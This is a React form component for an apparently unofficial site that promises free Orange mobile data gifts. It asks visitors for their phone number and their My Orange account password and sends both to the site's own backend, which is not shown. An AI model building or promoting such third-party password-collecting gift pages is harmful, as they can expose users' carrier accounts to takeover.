"use client"

import { useState } from "react"
import type { ServiceType } from "@/app/page"
import { Card, CardContent, CardHeader } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Button } from "@/components/ui/button"
import { Label } from "@/components/ui/label"
import { ArrowRight, Phone, Lock, Loader2, CheckCircle2, XCircle, AlertCircle } from "lucide-react"

interface ServiceFormProps {
  service: ServiceType
  onBack: () => void
}

type ResultStatus = "idle" | "loading" | "success" | "error" | "warning"

interface Result {
  status: ResultStatus
  message: string
}

export function ServiceForm({ service, onBack }: ServiceFormProps) {
  const [phone, setPhone] = useState("")
  const [password, setPassword] = useState("")
  const [result, setResult] = useState<Result>({ status: "idle", message: "" })

  const serviceConfig = {
    "500mb": {
      title: "500 ميجا اورنج",
      subtitle: "متجدد كل 15 يوم",
      gradient: "from-orange-500 to-orange-600",
      bgLight: "bg-orange-50",
      textColor: "text-orange-600",
      borderColor: "border-orange-200",
    },
    "250mb": {
      title: "250 ميجا فوازير",
      subtitle: "هدية يومية مجانية",
      gradient: "from-purple-500 to-purple-600",
      bgLight: "bg-purple-50",
      textColor: "text-purple-600",
      borderColor: "border-purple-200",
    },
  }

  const config = service ? serviceConfig[service] : serviceConfig["500mb"]

  const validatePhone = (value: string) => {
    return /^01[0-9]{9}$/.test(value)
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    
    if (!validatePhone(phone)) {
      setResult({ status: "error", message: "رقم الهاتف غير صحيح! يجب ان يكون 11 رقم ويبدا بـ 01" })
      return
    }

    if (password.length < 4) {
      setResult({ status: "error", message: "كلمة المرور يجب ان تكون 4 احرف على الاقل" })
      return
    }

    setResult({ status: "loading", message: "جاري المعالجة..." })

    try {
      const endpoint = service === "500mb" ? "/api/redeem-500" : "/api/fawazeer"
      const response = await fetch(endpoint, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ phone, password }),
      })

      const data = await response.json()

      if (data.success) {
        setResult({ status: "success", message: data.message })
      } else if (data.warning) {
        setResult({ status: "warning", message: data.message })
      } else {
        setResult({ status: "error", message: data.message })
      }
    } catch {
      setResult({ status: "error", message: "حدث خطا في الاتصال. حاول مرة اخرى" })
    }
  }

  const getResultIcon = () => {
    switch (result.status) {
      case "success":
        return <CheckCircle2 className="w-6 h-6 text-green-500" />
      case "error":
        return <XCircle className="w-6 h-6 text-red-500" />
      case "warning":
        return <AlertCircle className="w-6 h-6 text-amber-500" />
      default:
        return null
    }
  }

  const getResultStyles = () => {
    switch (result.status) {
      case "success":
        return "bg-green-50 border-green-200 text-green-700"
      case "error":
        return "bg-red-50 border-red-200 text-red-700"
      case "warning":
        return "bg-amber-50 border-amber-200 text-amber-700"
      default:
        return ""
    }
  }

  return (
    <div className="animate-in fade-in slide-in-from-left-4 duration-500">
      <Card className="bg-white/95 backdrop-blur shadow-xl border-0">
        <CardHeader className="pb-2">
          <button
            onClick={onBack}
            className="flex items-center gap-2 text-gray-500 hover:text-gray-700 transition-colors w-fit"
          >
            <ArrowRight className="w-5 h-5" />
            <span>رجوع</span>
          </button>
        </CardHeader>
        
        <CardContent className="space-y-6">
          {/* Service Header */}
          <div className="text-center space-y-2">
            <div className={`w-16 h-16 bg-gradient-to-br ${config.gradient} rounded-2xl mx-auto flex items-center justify-center shadow-lg`}>
              {service === "500mb" ? (
                <span className="text-xl font-bold text-white">500</span>
              ) : (
                <span className="text-xl font-bold text-white">250</span>
              )}
            </div>
            <h2 className="text-2xl font-bold text-gray-800">{config.title}</h2>
            <p className="text-gray-500">{config.subtitle}</p>
          </div>

          {/* Form */}
          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="space-y-2">
              <Label htmlFor="phone" className="text-gray-700 font-medium">
                رقم الهاتف
              </Label>
              <div className="relative">
                <Phone className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                <Input
                  id="phone"
                  type="tel"
                  placeholder="01234567890"
                  value={phone}
                  onChange={(e) => setPhone(e.target.value.replace(/\D/g, "").slice(0, 11))}
                  className="pr-11 h-12 text-lg border-2 focus:border-orange-400"
                  dir="ltr"
                />
              </div>
              <p className="text-xs text-gray-400 text-center">
                يجب ان يكون 11 رقم ويبدا بـ 01
              </p>
            </div>

            <div className="space-y-2">
              <Label htmlFor="password" className="text-gray-700 font-medium">
                كلمة مرور My Orange
              </Label>
              <div className="relative">
                <Lock className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                <Input
                  id="password"
                  type="password"
                  placeholder="ادخل كلمة المرور"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="pr-11 h-12 text-lg border-2 focus:border-orange-400"
                />
              </div>
            </div>

            <Button
              type="submit"
              disabled={result.status === "loading"}
              className={`w-full h-12 text-lg font-bold bg-gradient-to-r ${config.gradient} hover:opacity-90 transition-opacity`}
            >
              {result.status === "loading" ? (
                <>
                  <Loader2 className="w-5 h-5 ml-2 animate-spin" />
                  جاري المعالجة...
                </>
              ) : (
                "احصل على الهدية"
              )}
            </Button>
          </form>

          {/* Result */}
          {result.status !== "idle" && result.status !== "loading" && (
            <div className={`p-4 rounded-xl border-2 flex items-center gap-3 animate-in fade-in duration-300 ${getResultStyles()}`}>
              {getResultIcon()}
              <p className="font-medium">{result.message}</p>
            </div>
          )}

          {/* Footer Links */}
          <div className="pt-4 border-t border-gray-100">
            <div className="flex justify-center gap-3">
              <a 
                href="https://t.me/calm_aIways" 
                target="_blank" 
                rel="noopener noreferrer"
                className="px-4 py-2 bg-gray-100 hover:bg-gray-200 text-gray-600 rounded-full text-sm font-medium transition-colors"
              >
                قناة كتابات
              </a>
              <a 
                href="https://t.me/abo_shlkamy" 
                target="_blank" 
                rel="noopener noreferrer"
                className="px-4 py-2 bg-gray-100 hover:bg-gray-200 text-gray-600 rounded-full text-sm font-medium transition-colors"
              >
                المطور
              </a>
            </div>
          </div>
        </CardContent>
      </Card>
    </div>
  )
}
